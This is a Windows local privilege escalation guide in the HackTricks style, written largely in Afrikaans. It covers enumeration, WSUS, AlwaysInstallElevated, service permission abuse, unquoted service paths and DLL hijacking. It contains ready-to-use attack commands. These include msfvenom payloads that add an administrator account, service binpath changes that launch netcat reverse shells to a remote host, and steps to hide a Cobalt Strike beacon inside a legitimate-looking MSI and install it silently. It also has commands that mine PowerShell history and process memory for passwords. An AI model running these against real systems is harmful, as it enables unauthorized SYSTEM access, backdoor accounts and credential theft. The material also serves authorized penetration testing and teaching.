# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste hulpmiddel om Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Inleidende Windows-teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, lees asseblief die volgende bladsy voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Sekuriteitskontroles

Daar is verskeie dinge in Windows wat jou kan keer om die stelsel te enumereer, uitvoerbare lêers te laat loop of selfs jou aktiwiteite op te spoor. Jy moet die volgende bladsy lees en al hierdie verdedigingsmeganismes enumereer voordat jy met die privilege escalation enumeration begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Stelselinligting

### Weergawe-inligting-enumerasie

Kontroleer of die Windows-weergawe enige bekende kwetsbaarheid het (kontroleer ook watter patches toegepas is).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft-sekuriteitskwesbaarhede. Hierdie databasis bevat meer as 4,700 sekuriteitskwesbaarhede, wat die **massive attack surface** wat 'n Windows-omgewing bied, aantoon.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_

**Lokaal met stelsel-inligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos van exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Enige credential/Juicy info gestoor in die env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkripsielêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detaille van PowerShell-pyplynuitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdrag-aanroepe en dele van skripte. Dit is egter moontlik dat volledige uitvoeringsdetalje en uitvoerresultate nie vasgelê word nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files" afdeling van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeure van PowersShell logs te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige aktiwiteits- en inhoudsregister van die script se uitvoering word vasgelê, wat verseker dat elke block of code gedokumenteer word terwyl dit loop. Hierdie proses bewaar 'n omvattende audit trail van elke aktiwiteit, waardevol vir forensics en die ontleding van kwaadaardige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Loggebeurtenisse vir die Script Block kan binne die Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeurtenisse te sien, kan jy gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-instellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Skywe
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie met http**S** versoek word nie, maar met http.

Begin deur te kontroleer of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy 'n antwoord kry soos een van hierdie:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan is **it is exploitable.** As die laaste register gelyk is aan 0, sal die WSUS-inskrywing geïgnoreer word.

Om hierdie kwetsbaarhede uit te buit, kan jy gereedskap soos gebruik: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Dit is MiTM weaponized exploits-skripte om 'fake' updates in nie-SSL WSUS-verkeer te injekteer.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies is dit die fout wat hierdie bug uitbuit:

> As ons die mag het om ons plaaslike gebruikersproxy te wysig, en Windows Updates gebruik die proxy wat in Internet Explorer’s settings gekonfigureer is, het ons dus die mag om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te laat loop om ons eie verkeer te onderskep en kode as 'n geprivilegieerde gebruiker op ons toestel uit te voer.
>
> Verder, aangesien die WSUS-diens die huidige gebruiker se instellings gebruik, sal dit ook die gebruiker se sertifikaatwinkel gebruik. As ons 'n self-getekende sertifikaat vir die WSUS-hostname genereer en hierdie sertifikaat by die huidige gebruiker se sertifikaatwinkel voeg, sal ons beide HTTP en HTTPS WSUS-verkeer kan onderskep. WSUS gebruik geen HSTS-agtige meganismes om 'n trust-on-first-use'-tipe validering op die sertifikaat toe te pas nie. As die aangebiedde sertifikaat deur die gebruiker vertrou word en die korrekte hostname het, sal dit deur die diens aanvaar word.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## KrbRelayUp

Daar bestaan 'n **local privilege escalation**-kwetsbaarheid in Windows **domain**-omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar **LDAP signing is not enforced,** gebruikers self-regte het wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD),** te konfigureer, en die vermoë vir gebruikers om rekenaars binne die domain te skep. Dit is belangrik om op te let dat hierdie **requirements** met **default settings** vervul word.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die verloop van die aanval, sien [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** hierdie 2 registers is **enabled** (waarde is **0x1**), dan kan gebruikers van enige bevoegdheid `*.msi`-lêers **install** (uitvoer) as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI` opdrag van power-up om binne die huidige gids 'n Windows MSI-binêr te skep om voorregte te eskaleer. Hierdie skrip skryf 'n vooraf-gekompileerde MSI-installeerder uit wat 'n prompt gee vir 'n gebruiker/groep toevoeging (dus sal jy GUI-toegang nodig hê):
```
Write-UserAddMSI
```
Voer net die geskepte binêr uit om voorregte te verhoog.

### MSI Wrapper

Lees hierdie handleiding om te leer hoe om 'n MSI wrapper te skep met behulp van hierdie gereedskap. Let daarop dat jy 'n **.bat** lêer kan omsluit as jy **net** **command lines** wil **uitvoer**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Skep MSI met WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Skep MSI met Visual Studio

- **Genereer** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekboks. Kies die **Setup Wizard** project en klik **Next**.
- Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Klik aanhoudend **Next** totdat jy by stap 3 van 4 kom (choose files to include). Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc** projek in die **Solution Explorer** en in die **Properties**, verander **TargetPlatform** van **x86** na **x64**.
- Daar is ander properties wat jy kan verander, soos die **Author** en **Manufacturer** wat die geïnstalleerde app meer eg kan laat lyk.
- Regsklik die projek en kies **View > Custom Actions**.
- Regsklik **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe** lêer en klik **OK**. Dit sal verseker dat die beacon payload uitgevoer word sodra die installer uitgevoer word.
- Onder die **Custom Action Properties**, verander **Run64Bit** na **True**.
- Laastens, **bou dit**.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` verskyn, maak seker jy stel die platform op x64.

### MSI Installasie

Om die **installasie** van die kwaadwillige `.msi` lêer in die **agtergrond:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid uit te buit kan jy gebruik maak van: _exploit/windows/local/always_install_elevated_

## Antivirus en detektore

### Ouditinstellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy aandag daaraan gee
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van lokale Administrator-wagwoorde**, en verseker dat elke wagwoord **unik, gerandomiseer en gereeld opgedateer** word op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig in Active Directory gestoor en kan slegs deur gebruikers geraadpleeg word aan wie voldoende permissies via ACLs toegeken is; dit laat hulle toe om lokale admin-wagwoorde te besigtig indien hulle daartoe gemagtig is.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien dit aktief is, word onversleutelde wagwoorde in LSASS (Local Security Authority Subsystem Service) gestoor.\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) geïntroduceer om pogings deur onbetroubare prosesse om **read its memory** of inject code te **block**, en sodoende die stelsel verder te beveilig.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is bekendgestel in **Windows 10**. Die doel daarvan is om die credentials wat op 'n toestel gestoor is te beskerm teen bedreigings soos pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** word geauthentiseer deur die **Local Security Authority** (LSA) en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmelddata deur 'n geregistreerde sekuriteitspakket geauthentiseer word, word domain credentials vir die gebruiker gewoonlik vasgelê.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumereer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waarvan jy deel is interessante permissions het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy **tot 'n bevoorregte groep behoort, kan jy dalk privilegies eskaleer**. Lees oor bevoorregte groepe en hoe om hulle te misbruik om privilegies te eskaleer hier:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Lees meer** oor wat 'n **token** is op hierdie blad: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende blad om te **leer oor interessante tokens** en hoe om hulle te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Tuismappe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende Prosesse

### Lêer- en gidsregte

Eerstens, wanneer jy die prosesse lys, **kontroleer vir wagwoorde binne die opdragreël van die proses**.\
Kyk of jy **oor-skryf 'n lopende binary** kan of jy skryfregte op die binary-gids het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) te exploit:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kyk altyd vir moontlike [**electron/cef/chromium debuggers** wat aan die gang is; jy kan dit misbruik om bevoegdhede te verhoog](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die permissies van die proses se binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer die toestemmings van die vouers van die binaries van prosesse (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Jy kan 'n memory dump van 'n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP het die **credentials in clear text in memory**, probeer om die memory te dump en die credentials te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-apps

**Toepassings wat as SYSTEM hardloop kan 'n gebruiker toelaat om 'n CMD te begin, of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek vir "command prompt", klik op "Click to open Command Prompt"

## Dienste

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissies

Jy kan **sc** gebruik om inligting te kry oor 'n diens
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binêre **accesschk** van _Sysinternals_ te hê om die vereiste voorregvlak vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Jy kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Jy kan dit inskakel met
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost afhanklik is van SSDPSRV om te werk (vir XP SP1)**

**Nog 'n omseiling** van hierdie probleem is om uit te voer:
```
sc.exe config usosvc start= auto
```
### **Wysig die diens se binêre pad**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens het, is dit moontlik om die diens se uitvoerbare binêre lêer te wysig. Om dit te wysig en **sc** uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: Maak dit moontlik om die service-binary te herkonfigureer.
- **WRITE_DAC**: Maak permissie-herkonfigurasie moontlik, wat daartoe lei dat jy service-konfigurasies kan verander.
- **WRITE_OWNER**: Maak dit moontlik om eienaarskap te neem en permissies te herkonfigureer.
- **GENERIC_WRITE**: Sluit die vermoë in om service-konfigurasies te verander.
- **GENERIC_ALL**: Sluit ook die vermoë in om service-konfigurasies te verander.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Swak permissies van service-binaries

**Kontroleer of jy die binary wat deur 'n service uitgevoer word kan wysig** of of jy **skryfpermissies op die gids** het waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur 'n service uitgevoer word kry met **wmic** (nie in system32 nie) en jou permissies kontroleer met **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienste registry wysig permissions

Jy moet nagaan of jy enige service registry kan wysig.\
Jy kan jou **permissions** oor 'n service **registry** **check** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binêre wat deur die diens uitgevoer word, verander word.

Om die Path van die uitgevoerde binêre te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die pad na 'n executable nie tussen aanhalings is nie, sal Windows probeer om elke einde voor 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle dienspade sonder aanhalingstekens, uitgesluit dié wat aan ingeboude Windows-dienste behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid opspoor en uitbuit** met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n service binary met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word as 'n diens faal. Hierdie funksie kan gekonfigureer word om na 'n binary te wys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede is beskikbaar in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Toepassings

### Geïnstalleerde toepassings

Kontroleer die **regte van die binaries** (miskien kan jy een oorskryf en privilege escalation uitvoer) en van die **vouers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryfregte

Kontroleer of jy 'n konfigurasielêer kan wysig om 'n spesiale lêer te lees, of dat jy 'n binêre lêer kan wysig wat deur 'n Administrator-rekening uitgevoer gaan word (schedtasks).

Een manier om swak vouer-/lêertoestemmings in die stelsel te vind, is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Voer by opstart uit

**Kontroleer of jy 'n registry of binary kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drywers

Kyk vir moontlike **derdeparty vreemde/kwesbare** drywers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n arbitrêre kernel read/write primitive blootstel (algemeen in swak ontwerpte IOCTL handlers), kan jy eskaleer deur 'n SYSTEM token direk uit kernel memory te steel. Sien die stap‑vir‑stap tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

As jy **write permissions inside a folder present on PATH** het, kan jy dalk 'n DLL wat deur 'n proses gelaai word onderskep en **escalate privileges**.

Kontroleer die permissies van alle vouers binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Netwerk

### Gedeelde gidse
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kontroleer vir ander bekende rekenaars wat hardgekodeer is in die hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkinterfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

